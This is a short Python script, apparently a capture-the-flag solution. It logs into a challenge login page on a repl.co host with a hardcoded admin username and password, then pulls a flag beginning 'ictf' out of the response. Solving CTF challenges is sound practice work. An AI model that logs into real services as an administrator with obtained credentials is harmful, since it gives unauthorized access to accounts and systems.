import requests
host = 'https://login-page.max49.repl.co'
data = {'username':'theadminaccount','pass':'sfN7?v,2T3ZVSk+2RX~'}
r = requests.post(host+'/login', data=data)
flag = r.text[r.text.index('ictf'):r.text.index('}')+1]
print('flag is {}'.format(flag))
